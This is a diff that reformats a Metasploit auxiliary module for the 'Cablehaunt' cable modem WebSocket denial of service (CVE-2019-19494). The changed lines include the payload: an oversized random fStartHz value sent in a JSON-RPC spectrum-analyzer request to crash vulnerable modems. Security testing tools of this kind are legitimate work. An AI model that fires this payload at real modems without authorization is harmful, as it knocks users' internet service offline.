@@ -10,32 +10,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => '"Cablehaunt" Cable Modem WebSocket DoS',
-      'Description' => %q{
-        There exists a buffer overflow vulnerability in certain
-        Cable Modem Spectrum Analyzer interfaces.  This overflow
-        is exploitable, but since an exploit would differ between
-        every make, model, and firmware version (which also
-        differs from ISP to ISP), this module simply causes a
-        Denial of Service to test if the vulnerability is present.
-      },
-      'Author' => [
-        'Alexander Dalsgaard Krog (Lyrebirds)', # Original research, discovery, and PoC
-        'Jens Hegner Stærmose (Lyrebirds)', # Original research, discovery, and PoC
-        'Kasper Kohsel Terndrup (Lyrebirds)', # Original research, discovery, and PoC
-        'Simon Vandel Sillesen (Independent)', # Original research, discovery, and PoC
-        'Nicholas Starke' # msf module
-      ],
-      'References' => [
-        ['CVE', '2019-19494'],
-        ['EDB', '47936'],
-        ['URL', 'https://cablehaunt.com/'],
-        ['URL', 'https://github.com/Lyrebirds/sagemcom-fast-3890-exploit']
-      ],
-      'DisclosureDate' => 'Jan 07 2020',
-      'License' => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => '"Cablehaunt" Cable Modem WebSocket DoS',
+        'Description' => %q{
+          There exists a buffer overflow vulnerability in certain
+          Cable Modem Spectrum Analyzer interfaces.  This overflow
+          is exploitable, but since an exploit would differ between
+          every make, model, and firmware version (which also
+          differs from ISP to ISP), this module simply causes a
+          Denial of Service to test if the vulnerability is present.
+        },
+        'Author' => [
+          'Alexander Dalsgaard Krog (Lyrebirds)', # Original research, discovery, and PoC
+          'Jens Hegner Stærmose (Lyrebirds)', # Original research, discovery, and PoC
+          'Kasper Kohsel Terndrup (Lyrebirds)', # Original research, discovery, and PoC
+          'Simon Vandel Sillesen (Independent)', # Original research, discovery, and PoC
+          'Nicholas Starke' # msf module
+        ],
+        'References' => [
+          ['CVE', '2019-19494'],
+          ['EDB', '47936'],
+          ['URL', 'https://cablehaunt.com/'],
+          ['URL', 'https://github.com/Lyrebirds/sagemcom-fast-3890-exploit']
+        ],
+        'DisclosureDate' => '2020-01-07',
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
@@ -76,16 +79,16 @@ class MetasploitModule < Msf::Auxiliary
             print_status('Sending payload')
             payload = Rex::Text.rand_text_alphanumeric(7000..8000)
             driver.send({
-              'jsonrpc': '2.0',
-              'method': 'Frontend::GetFrontendSpectrumData',
-              'params': {
-                'coreID': 0,
-                'fStartHz': payload,
-                'fStopHz': 1000000000,
-                'fftSize': 1024,
-                'gain': 1
+              jsonrpc: '2.0',
+              method: 'Frontend::GetFrontendSpectrumData',
+              params: {
+                coreID: 0,
+                fStartHz: payload,
+                fStopHz: 1000000000,
+                fftSize: 1024,
+                gain: 1
               },
-              'id': '0'
+              id: '0'
             }.to_json)
           rescue StandardError
             fail_with(Failure::Unreachable, 'Could not establish websocket connection')
